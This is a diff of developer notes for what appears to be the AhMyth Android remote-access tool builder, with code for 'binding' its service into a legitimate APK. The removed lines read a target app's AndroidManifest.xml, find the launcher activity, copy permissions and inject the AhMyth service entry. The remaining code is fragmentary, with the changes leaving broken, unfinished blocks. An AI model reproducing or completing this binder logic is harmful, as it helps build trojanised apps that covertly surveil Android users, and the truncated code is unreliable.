@@ -1,4 +1,5 @@
 ## Launcher Extraction for `<application` attribute | AppCtrl.js |
+#### This won't be added until I can figure out a new Hook function
 - Need to figure out how to add a secondary `<activity` regex if the `<application` regex returns -1
 - Need to figure out how to add third subsidiary `<activity-alias` regex for the `manifest.indexOf("android:targetActivity")` section of this function if the first 2 regex's return -1
 ```javascript
@@ -74,6 +75,7 @@ fs.writeFile(launcherPath, output, 'utf8', (error) => {
 ```
     
 ## Code Sets for function to stop listening | AppCtrl.js + main.js + build.html |
+#### Not far from done just need to debug and fix a few things
 ```javascript
     // when user clicks Disconnect Button
     $appCtrl.Stop = (port) => {
@@ -157,37 +159,7 @@ process.on('uncaughtException', function (error) {
 ```
 ## New Complete Bind on Launch function for Linux & OS X
 ```js
-    $appCtrl.BindOnLauncher = (apkFolder) => {
 
-        $appCtrl.Log('Finding Launcher Activity From AndroidManifest.xml...');
-        $appCtrl.Log();
-        fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
-            if (error) {
-                $appCtrl.Log('Reading AndroidManifest.xml Failed!', CONSTANTS.logStatus.FAIL);
-                $appCtrl.Log();
-                return;
-            }
-
-            var launcherActivity = GetLauncherActivity(data, apkFolder);
-            if (launcherActivity == -1) {
-                $appCtrl.Log("Cannot Find the Launcher Activity in the Manifest!", CONSTANTS.logStatus.FAIL);
-                $appCtrl.Log("Please Template Another APK.", CONSTANTS.logStatus.INFO);
-                $appCtrl.Log();
-                return;
-            }
-
-            var ahmythService = CONSTANTS.ahmythService;
-            $appCtrl.Log('Modifying AndroidManifest.xml...');
-            $appCtrl.Log();
-            var permManifest = $appCtrl.copyPermissions(data);
-            var newManifest = permManifest.substring(0, permManifest.indexOf("</application>")) + ahmythService + permManifest.substring(permManifest.indexOf("</application>"));
-            fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), newManifest, 'utf8', (error) => {
-                if (error) {
-                    $appCtrl.Log('Modifying AndroidManifest.xml Failed', CONSTANTS.logStatus.FAIL);
-                    $appCtrl.Log();
-                    return;
-                }
-        
                 // This makes use of the Unix 'find' command in order to locate an APK's launcher activity
                 $appCtrl.Log("Locating Launcher Activity...")
                 $appCtrl.Log();
@@ -264,38 +236,7 @@ process.on('uncaughtException', function (error) {
     }
 ``` 
 ## New Complete Bind On Launch function for Windows
-```js
-    $appCtrl.BindOnLauncher = (apkFolder) => {
-
-        $appCtrl.Log('Finding Launcher Activity From AndroidManifest.xml...');
-        $appCtrl.Log();
-        fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
-            if (error) {
-                $appCtrl.Log('Reading AndroidManifest.xml Failed!', CONSTANTS.logStatus.FAIL);
-                $appCtrl.Log();
-                return;
-            }
-
-            var launcherActivity = GetLauncherActivity(data, apkFolder);
-            if (launcherActivity == -1) {
-                $appCtrl.Log("Cannot Find the Launcher Activity in the Manifest!", CONSTANTS.logStatus.FAIL);
-                $appCtrl.Log("Please Template Another APK.", CONSTANTS.logStatus.INFO);
-                $appCtrl.Log();
-                return;
-            }
-
-            var ahmythService = CONSTANTS.ahmythService;
-            $appCtrl.Log('Modifying AndroidManifest.xml...');
-            $appCtrl.Log();
-            var permManifest = $appCtrl.copyPermissions(data);
-            var newManifest = permManifest.substring(0, permManifest.indexOf("</application>")) + ahmythService + permManifest.substring(permManifest.indexOf("</application>"));
-            fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), newManifest, 'utf8', (error) => {
-                if (error) {
-                    $appCtrl.Log('Modifying AndroidManifest.xml Failed', CONSTANTS.logStatus.FAIL);
-                    $appCtrl.Log();
-                    return;
-                }
-        
+```js  
                 // This makes use of the 'set-location' & 'gci' PowerShell 
                 // commands to locate the Launcher Activity
                 $appCtrl.Log("Locating Launcher Activity...");
